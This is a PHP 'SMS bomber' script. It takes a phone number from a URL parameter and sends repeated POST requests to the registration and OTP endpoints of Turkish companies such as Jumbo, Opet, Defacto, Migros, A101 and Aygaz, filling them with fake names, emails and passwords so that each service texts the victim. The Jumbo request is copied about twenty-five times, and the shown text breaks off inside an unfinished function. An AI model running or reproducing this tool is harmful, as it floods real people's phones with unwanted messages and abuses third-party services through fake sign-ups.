
<?php

error_reporting(0);

if (!isset($_GET['number'])) {
  $error = array('error' => 'TELEFON degeri belirtilmedi.');
  echo json_encode($error, JSON_UNESCAPED_UNICODE);
  exit;
}

if(isset($_GET['number']))
{

    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";
    $number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);
	echo "success";

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	function Migros($tc)
                                        {
                                            $url = 'https://rest.migros.com.tr:443/sanalmarket/users/login/otp';
                                            $data = array("phoneNumber" => "$tc");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function Sakasu($tc)
                                        {
                                            $url = 'https://mobilcrm2.saka.com.tr:443/api/customer/login';
                                            $data = array("gsm" => "$tc");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function Koctas($tc)
                                        {
                                            $ch = curl_init();
                                            curl_setopt($ch, CURLOPT_URL, "https://occ2.koctas.com.tr:443/koctaswebservices/v2/koctas/registerParo/get-register-parocard-otp");
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt(
                                                $ch,
                                                CURLOPT_POSTFIELDS,
                                                "givePermission=true&mobileNumber=$tc"
                                            );
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                            $server_output = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function A101($tc)
                                        {
                                            $ch = curl_init();
                                            curl_setopt($ch, CURLOPT_URL, "https://www.a101.com.tr:443/users/otp-login/");
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
                                            curl_setopt(
                                                $ch,
                                                CURLOPT_POSTFIELDS,
                                                "phone=0$tc&next=/a101-kapida"
                                            );
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                            $server_output = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function KahveDunyasi($tc)
                                        {
                                            $ch = curl_init();
                                            curl_setopt($ch, CURLOPT_URL, "https://core.kahvedunyasi.com/api/users/sms/send");
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
                                            curl_setopt(
                                                $ch,
                                                CURLOPT_POSTFIELDS,
                                                "mobile_number=$tc&token_type=register_token"
                                            );
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                            $server_output = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function IPApp($tc)
                                        {
                                            $url = 'https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp';
                                            $data = array("birthDate" => "31/08/1975", "carPlate" => "31 ABC 31", "name" => "Memati Bas", "otp" => "", "phoneNumber" => $tc, "playerId" => "");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function NaosStars($tc)
                                        {
                                            $salt = md5(rand(1, 9));
                                            $result = substr($salt, 1, 10);
                                            $email = $result . "@gmail.com";
                                            $ch = curl_init();
                                            curl_setopt($ch, CURLOPT_URL, "https://shop.naosstars.com/users/register/");
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
                                            curl_setopt(
                                                $ch,
                                                CURLOPT_POSTFIELDS,
                                                "email=$email&first_name=Memati&last_name=Bas&password=31ABC..abc31&date_of_birth=1975-12-31&phone=0$tc&gender=male&kvkk=true&contact=true&confirm=true"
                                            );
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                            $server_output = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function Aygaz($tc)
                                        {
                                            $salt = md5(rand(1, 9));
                                            $result = substr($salt, 1, 10);
                                            $email = $result . "@gmail.com";
                                            $url = 'https://mogazmobilapinew.aygaz.com.tr:443/api/Member/UserRegister';
                                            $data = array("address" => "", "birthDate" => "31-08-1975", "city" => 0, "deviceCode" => "839C5FAF-A7C1-2CDA--6F5414AD2228", "district" => 0, "email" => $email, "isUserAgreement" => True, "name" => "Memati", "password" => "", "phone" => $tc, "productType" => 1, "subscription" => True, "surname" => "Bas");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function KimGb($tc)
                                        {
                                            $url = 'https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp';
                                            $data = array("msisdn" => "90$tc");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function EnglishHome($tc)
                                        {
                                            $salt = md5(rand(1, 9));
                                            $result = substr($salt, 1, 10);
                                            $email = $result . "@gmail.com";
                                            $ch = curl_init();
                                            curl_setopt($ch, CURLOPT_URL, "https://www.englishhome.com:443/enh_app/users/registration/");
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
                                            curl_setopt(
                                                $ch,
                                                CURLOPT_POSTFIELDS,
                                                "first_name=Memati&last_name=Bas&email=$email&phone=0$tc&password=31ABC..abc31&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true"
                                            );
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                            $server_output = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function Uludag($tc)
                                        {
                                            file_get_contents("https://bilet.balikesiruludag.com.tr:443/mobil/UyeOlKontrol.php?CepTelefon=$tc");
                                        }

                                        function Pisir($tc)
                                        {
                                            $salt = md5(rand(1, 9));
                                            $result = substr($salt, 1, 10);
                                            $email = $result . "@gmail.com";
                                            $url = 'https://api.pisir.com:443/v1/login/';
                                            $data = array("app_build" => "343", "app_platform" => "ios", "msisdn" => "$tc");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }


                                        function Defacto($tc)
                                        {
                                            $url = 'https://www.defacto.com.tr:443/Customer/SendPhoneConfirmationSms';
                                            $data = array("mobilePhone" => "$tc");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function Opet($tc)
                                        {
                                            $salt = md5(rand(1, 9));
                                            $result = substr($salt, 1, 10);
                                            $email = $result . "@gmail.com";
                                            $url = 'https://api.opet.com.tr:443/api/authentication/register';
